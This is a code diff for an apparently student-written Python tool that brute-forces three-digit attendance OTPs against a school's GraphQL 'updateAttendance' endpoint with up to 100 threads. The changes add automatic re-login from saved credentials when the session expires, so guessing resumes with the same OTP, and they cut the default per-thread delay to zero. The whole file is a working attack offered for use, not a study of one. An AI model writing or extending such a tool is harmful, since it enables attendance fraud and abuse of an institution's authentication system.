@@ -146,6 +146,7 @@ def run_attack_core(target_url, target_headers, num_threads, cooldown, account_n
     
     def worker_thread(thread_id, allocated_otps):
         """Worker thread to check a specific list of OTPs"""
+        nonlocal target_url, target_headers
         for otp in allocated_otps:
             # Check if we should stop
             if stop_event.is_set() or success_event.is_set():
@@ -178,37 +179,104 @@ def run_attack_core(target_url, target_headers, num_threads, cooldown, account_n
                     success_event.set()
                 return
 
-            # Make request
-            response_json, error = check_otp(otp, url=target_url, headers=target_headers)
-            
-            if error:
-                with print_lock:
-                    print(font(f" [{account_name}] [Thread {thread_id}] [ERROR] {otp}: {error}", color="red"))
-            else:
-                # Check for success
-                if 'data' in response_json and response_json['data'] and response_json['data'].get('updateAttendance'):
-                    with print_lock:
-                        print(font(f"\n [{account_name}] [Thread {thread_id}] [SUCCESS] OTP Found: {otp} ", color="green", inverse=True))
-                        found_otp[0] = otp
-                    
-                    # Update global context
-                    if shared_context:
-                        shared_context['found_otp'] = otp
-                        
-                    success_event.set()  # Signal all threads for THIS account to stop
-                    return
+            while True:
+                # Make request
+                response_json, error = check_otp(otp, url=target_url, headers=target_headers)
                 
-                # Check for errors
-                elif 'errors' in response_json:
-                    error_msg = response_json['errors'][0]['message']
+                if error:
                     with print_lock:
-                        if "You are not registered to this class" in error_msg:
-                            print(f" [{account_name}] [Thread {thread_id}] [FAILED] {otp} - Not Result")
-                        else:
-                            print(f" [{account_name}] [Thread {thread_id}] [FAILED] {otp} - {error_msg}")
+                        print(font(f" [{account_name}] [Thread {thread_id}] [ERROR] {otp}: {error}", color="red"))
+                    break # Break retry loop
                 else:
-                    with print_lock:
-                        print(f" [{account_name}] [Thread {thread_id}] [FAILED] {otp} (Unknown response)")
+                    # Check for success
+                    if 'data' in response_json and response_json['data'] and response_json['data'].get('updateAttendance'):
+                        with print_lock:
+                            print(font(f"\n [{account_name}] [Thread {thread_id}] [SUCCESS] OTP Found: {otp} ", color="green", inverse=True))
+                            found_otp[0] = otp
+                        
+                        # Update global context
+                        if shared_context:
+                            shared_context['found_otp'] = otp
+                            
+                        success_event.set()  # Signal all threads for THIS account to stop
+                        return
+                    
+                    # Check for errors
+                    elif 'errors' in response_json:
+                        error_msg = response_json['errors'][0]['message']
+                        if "You are not registered to this class" in error_msg:
+                            with print_lock:
+                                print(f" [{account_name}] [Thread {thread_id}] [FAILED] {otp} - Not Result")
+                            break
+                        elif "jwt expired" in error_msg.lower() or "session expired" in error_msg.lower() or "unauthorized" in error_msg.lower():
+                            with print_lock:
+                                print(font(f" [{account_name}] [Thread {thread_id}] [EXPIRED] Session expired on OTP {otp}. Auto-refreshing...", color="yellow"))
+                            
+                            # Only let one thread refresh at a time across all threads
+                            with sync_lock:
+                                try:
+                                    import json
+                                    import subprocess
+                                    login_file = os.path.join(os.getcwd(), 'Input', 'SavedLogins', 'fast_single.json')
+                                    dest_file = os.path.join(os.getcwd(), 'Input', 'temp.txt')
+                                    
+                                    if os.path.exists(login_file):
+                                        script = f"""
+import sys
+import json
+import traceback
+try:
+    from menus import auto_grab_curl
+    with open(r'{login_file}', 'r') as f:
+        login_data = json.load(f)
+    auto_grab_curl(save_dest=r'{dest_file}', login_data=login_data, headless=True)
+except Exception as e:
+    print("ERROR:", e)
+    sys.exit(1)
+"""
+                                        # Refresh via subprocess to prevent async loop hang
+                                        result = subprocess.run(["python", "-c", script], capture_output=True, text=True)
+                                        
+                                        if result.returncode != 0 or "ERROR:" in result.stdout:
+                                            with print_lock:
+                                                print(font(f" [{account_name}] [Thread {thread_id}] [FAILED] Auto-refresh subprocess failed. {result.stdout.strip()} {result.stderr.strip()}", color="red"))
+                                            break
+                                        
+                                        # Reload config for this thread
+                                        with open(dest_file, 'r', encoding='utf-8') as f:
+                                            content = f.read().strip()
+                                        if content:
+                                            parsed_url, parsed_headers = parse_curl(content)
+                                            if parsed_url:
+                                                target_url = parsed_url
+                                                # Update global URL if needed, but here we just update thread local
+                                                global URL
+                                                URL = target_url
+                                            if parsed_headers:
+                                                target_headers = parsed_headers
+                                                global HEADERS
+                                                HEADERS = target_headers
+                                        
+                                        with print_lock:
+                                            print(font(f" [{account_name}] [Thread {thread_id}] [SUCCESS] Session refreshed. Retrying {otp}...", color="green"))
+                                        # Continue the while loop to retry the SAME OTP
+                                        continue
+                                    else:
+                                        with print_lock:
+                                            print(font(f" [{account_name}] [Thread {thread_id}] [FAILED] No saved login found to auto-refresh.", color="red"))
+                                        break
+                                except Exception as e:
+                                    with print_lock:
+                                        print(font(f" [{account_name}] [Thread {thread_id}] [ERROR] Auto-refresh failed: {e}", color="red"))
+                                    break
+                        else:
+                            with print_lock:
+                                print(f" [{account_name}] [Thread {thread_id}] [FAILED] {otp} - {error_msg}")
+                            break
+                    else:
+                        with print_lock:
+                            print(f" [{account_name}] [Thread {thread_id}] [FAILED] {otp} (Unknown response)")
+                        break
             
             # Cooldown for this thread
             slept = 0
@@ -369,7 +437,10 @@ def start_experimental():
     
     # Prompt for thread count
     try:
-        thread_input = input(" Enter number of threads (default 4, max 100): ")
+        thread_input = input(" Enter number of threads (default 4, max 100) [or 'back']: ")
+        if thread_input.strip().lower() == 'back':
+            return
+            
         num_threads = int(thread_input) if thread_input.strip() else 4
         if num_threads < 1 or num_threads > 100:
             print(" Invalid thread count. Using default 4.")
@@ -380,11 +451,11 @@ def start_experimental():
     
     # Prompt for per-thread cooldown
     try:
-        cooldown_input = input(" Enter per-thread cooldown in seconds (default 0.5): ")
-        cooldown = float(cooldown_input) if cooldown_input.strip() else 0.5
+        cooldown_input = input(" Enter per-thread cooldown in seconds (default 0): ")
+        cooldown = float(cooldown_input) if cooldown_input.strip() else 0.0
     except ValueError:
-        print(" Invalid input. Using default 0.5s.")
-        cooldown = 0.5
+        print(" Invalid input. Using default 0s.")
+        cooldown = 0.0
     
     run_attack_core(URL, HEADERS, num_threads, cooldown, account_name="Main Config")
     
@@ -646,7 +717,10 @@ def test_connection():
         return
     print(font("\n Testing Connection...", color="yellow", inverse=True))
     
-    otp = input(" Enter OTP to test (3 digits): ")
+    otp = input(" Enter OTP to test (3 digits) [or 'back']: ").strip()
+    if otp.lower() == 'back':
+        return
+        
     if not otp: otp = "000"
 
     payload = {
